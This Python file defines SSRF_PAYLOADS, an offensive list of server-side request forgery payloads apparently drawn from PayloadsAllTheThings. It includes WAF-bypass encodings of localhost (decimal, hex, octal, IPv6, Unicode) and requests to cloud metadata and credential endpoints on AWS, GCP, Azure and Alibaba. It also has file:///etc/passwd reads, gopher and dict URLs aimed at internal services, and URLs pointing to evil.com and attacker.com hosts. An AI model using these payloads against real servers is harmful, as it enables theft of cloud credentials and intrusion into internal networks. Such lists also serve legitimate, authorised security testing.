"""
SSRF (Server-Side Request Forgery) Payloads with WAF Bypass
"""

# 15. SSRF Payloads - from PayloadsAllTheThings
SSRF_PAYLOADS = [
    # Localhost bypasses
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://[0000::1]",
    "http://[::ffff:127.0.0.1]",
    "http://127.1",
    "http://127.0.1",
    "http://0",
    # Decimal IP
    "http://2130706433",  # 127.0.0.1
    "http://3232235521",  # 192.168.0.1
    "http://2852039166",  # 169.254.169.254 (AWS metadata)
    # Hex IP
    "http://0x7f000001",  # 127.0.0.1
    "http://0xc0a80001",  # 192.168.0.1
    "http://0xa9fea9fe",  # 169.254.169.254
    # Octal IP
    "http://0177.0.0.1",  # 127.0.0.1
    # Cloud Metadata endpoints
    "http://169.254.169.254/latest/meta-data/",  # AWS
    "http://169.254.169.254/latest/user-data/",  # AWS
    "http://169.254.169.254/latest/api/token",  # AWS IMDSv2
    "http://metadata.google.internal/computeMetadata/v1/",  # GCP
    "http://169.254.169.254/metadata/instance",  # Azure
    "http://100.100.100.200/latest/meta-data/",  # Alibaba Cloud
    "http://169.254.170.2/v1/credentials",  # AWS ECS
    # DNS rebinding
    "http://localtest.me",  # resolves to ::1
    "http://spoofed.burpcollaborator.net",
    "http://127.0.0.1.nip.io",
    
    # ============================================
    # WAF BYPASS VARIATIONS FOR SSRF
    # ============================================
    
    # URL encoding
    "http://%31%32%37%2e%30%2e%30%2e%31",  # 127.0.0.1
    "http://%6c%6f%63%61%6c%68%6f%73%74",  # localhost
    
    # Double encoding
    "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531",
    
    # Mixed case and encoding
    "http://LOCALHOST",
    "http://LocalHost",
    "http://lOcAlHoSt",
    
    # IPv6 variations
    "http://[0:0:0:0:0:0:0:1]",
    "http://[0:0:0:0:0:ffff:127.0.0.1]",
    "http://[::ffff:7f00:1]",
    "http://[::]",
    
    # Domain tricks
    "http://127.0.0.1.xip.io",
    "http://www.127.0.0.1.xip.io",
    "http://127.0.0.1.sslip.io",
    "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
    
    # Redirect bypass
    "http://attacker.com/redirect?url=http://169.254.169.254/",
    
    # Protocol variations
    "gopher://127.0.0.1:25/_",
    "dict://127.0.0.1:6379/info",
    "file:///etc/passwd",
    "sftp://evil.com:22/",
    "tftp://evil.com:69/",
    "ldap://evil.com:389/",
    
    # AWS metadata bypass
    "http://[fd00:ec2::254]/latest/meta-data/",  # AWS IPv6 metadata
    "http://169.254.169.254.xip.io/latest/meta-data/",
    "http://169.254.169.254.nip.io/latest/meta-data/",
    "http://instance-data/latest/meta-data/",  # AWS internal DNS
    "http://169.254.169.254:80/latest/meta-data/",
    "http://169.254.169.254:8080/latest/meta-data/",
    "http://169.254.169.254%00.attacker.com/latest/meta-data/",
    
    # GCP metadata bypass  
    "http://169.254.169.254/computeMetadata/v1/",
    "http://metadata/computeMetadata/v1/",
    "http://metadata.google.internal./computeMetadata/v1/",
    
    # Azure metadata bypass
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token",
    
    # Rare localhost representations
    "http://127.127.127.127",
    "http://127.0.0.255",
    "http://127.255.255.255",
    "http://0.0.0.0:80",
    "http://0.0.0.0:443",
    "http://[0000:0000:0000:0000:0000:0000:0000:0001]",
    "http://0x7f.0.0.1",
    "http://0177.0.0.01",
    "http://①②⑦.⓪.⓪.①",  # Unicode digits
    
    # Cloudflare Workers bypass
    "http://workers.dev/",
    "https://workers.cloudflare.com/",
]
